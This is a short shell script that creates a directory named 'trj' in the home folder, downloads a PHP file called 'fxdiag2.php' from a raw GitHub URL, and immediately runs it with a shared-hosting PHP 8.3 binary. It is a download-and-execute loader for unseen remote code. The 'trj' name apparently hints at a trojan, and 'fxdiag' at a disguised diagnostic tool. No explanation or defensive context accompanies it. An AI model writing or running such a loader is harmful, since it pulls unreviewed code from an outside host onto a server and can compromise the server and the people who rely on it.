#!/bin/sh
D=$HOME/trj; mkdir -p "$D"; cd "$D" || exit 1
curl -fsSL -o fxdiag2.php.new "https://raw.githubusercontent.com/a04032417-svg/Dar101/trj/trj/fxdiag2.php?t=$(date +%s)" && mv fxdiag2.php.new fxdiag2.php
/opt/alt/php83/usr/bin/php fxdiag2.php "$1"
